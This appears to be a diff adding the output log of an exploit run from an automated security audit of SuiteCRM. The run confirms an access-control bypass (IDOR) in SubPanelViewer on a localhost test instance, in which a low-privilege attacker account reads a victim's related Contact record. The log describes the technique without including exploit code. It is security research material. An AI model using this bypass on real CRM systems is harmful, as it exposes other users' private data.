@@ -1,0 +1,19 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-024/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-024/../.venv
+========================================================================
+VULN-024: SubPanelViewer parent-ACL bypass (IDOR) -- read another user's related records
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web login
+[SETUP] provisioning victim (V) and attacker (A) -- fresh, unrelated low-priv users
+[INFO] victim   = mod_6a2ad21b (f50a165a-2a33-4620-94b0-0cf16f87f74b)
+[INFO] attacker = mod_265f2830 (afd78988-19e8-44ce-9cc5-5b85e61ca4bb)
+[SETUP] as V: create an Account
+[OK] Account created: 72e4a438-0f5b-4929-9815-165f5d1bd9bd (V024Acc_a0378e89), owned by V
+[SETUP] as V: create a Contact related to that Account (account_id set directly)
+[OK] Contact created: 20f10308-a737-4d20-b6ab-27f450f4a86f (last_name=V024Contact_c4aaba90), related to the Account, owned by V
+[STEP] as A (zero relationship to V's Account/Contact): request the Account's 'contacts' subpanel via SubPanelViewer
+[PROOF] response status=200 len=9884
+[PROOF] victim Contact last_name marker 'V024Contact_c4aaba90' present in A's subpanel response: True
+[OK] attacker's SubPanelViewer response contains the victim-owned Contact's data
+==> VULN-024: CONFIRMED — attacker read victim's related Contact (V024Contact_c4aaba90) via SubPanelViewer with zero ACL prompt
